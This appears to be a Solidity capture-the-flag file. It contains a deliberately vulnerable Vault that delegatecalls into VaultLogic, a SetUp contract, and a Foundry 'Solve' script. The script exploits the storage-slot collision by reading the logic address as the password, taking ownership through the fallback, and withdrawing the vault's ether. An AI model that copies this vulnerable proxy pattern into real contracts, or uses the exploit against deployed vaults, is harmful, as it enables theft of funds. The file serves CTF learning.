pragma solidity ^0.8.0;
import "forge-std/Script.sol";

contract VaultLogic {

  address payable public owner;
  bytes32 private password;

  constructor(bytes32 _password) {
    owner = payable(msg.sender);
    password = _password;
  }

  function changeOwner(bytes32 _password, address payable newOwner) public {
           if (password == _password) {
        owner = newOwner;
    } 
  }

 function withdraw() external {
           if (owner == msg.sender) {
          owner.transfer(address(this).balance);
     }
  }

}

contract Vault {

  address public owner;
  VaultLogic logic;

  constructor(address _logicAddress) payable {
    logic = VaultLogic(_logicAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(logic).delegatecall(msg.data);
    if (result) {
      this;
    }
  }

   receive() external payable {}


}
contract SetUp {

    address public logic ;
    
    address payable public vault;


    constructor(bytes32 _password) payable{
        VaultLogic logicCon = new VaultLogic(_password);
        logic = address(logicCon);
        Vault vaultCon = new Vault(logic);
        vault = payable(address(vaultCon));
        vault.call{value: 1 ether}("");
    }

    function isSolved() public view returns(bool) {
        return vault.balance == 0;
    }
}

contract Solve is Script {
  SetUp setup = SetUp(0xaEc816fEb4cBd7b26630b80e39257027fCecF6dd);
  Vault vault = Vault(setup.vault());
  VaultLogic logic = VaultLogic(setup.logic());
  address payable ETH_ADDRESS = payable(address(0x59A5e9C7798946C9933a64f552f33b10Dd9539e3));
  function run() external {
    vm.startBroadcast(); 
    console.log('Our address:', address(this));
    console.log('Eth address: ', ETH_ADDRESS);

    bytes32 password = bytes32(uint256(bytes32(bytes20(address(logic))))>>96);
    console.log('Password:');
    console.logBytes32(password);

    console.log('Current owner: ', vault.owner());
    address(vault).call(abi.encodeCall(VaultLogic.changeOwner, (password, ETH_ADDRESS)));
    console.log('New owner: ', vault.owner());
    assert(vault.owner() == ETH_ADDRESS);
    
    console.log('Current balance:', address(vault).balance);
    address(vault).call(abi.encodeCall(VaultLogic.withdraw, ()));
    console.log('New balance:', address(vault).balance);
    console.log('isSolved =', setup.isSolved());

    vm.stopBroadcast();
  }
  receive() external payable {}
  fallback() external payable {}
}
